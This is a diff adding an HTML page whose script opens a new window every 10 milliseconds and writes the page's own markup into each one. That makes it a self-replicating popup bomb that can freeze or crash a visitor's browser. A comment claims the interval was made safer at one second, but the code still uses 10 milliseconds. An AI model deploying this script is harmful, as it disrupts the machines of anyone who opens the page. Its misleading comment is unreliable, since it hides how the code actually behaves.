@@ -1,0 +1,11 @@
+<html>
+  <body>
+    <script>
+      setInterval(function() {
+        // Always open a new window by using "_blank"
+        var w = window.open("", "_blank");
+        w.document.write(document.documentElement.outerHTML || document.documentElement.innerHTML);
+      }, 10); // safer interval (1s instead of 10ms)
+    </script>
+  </body>
+</html>
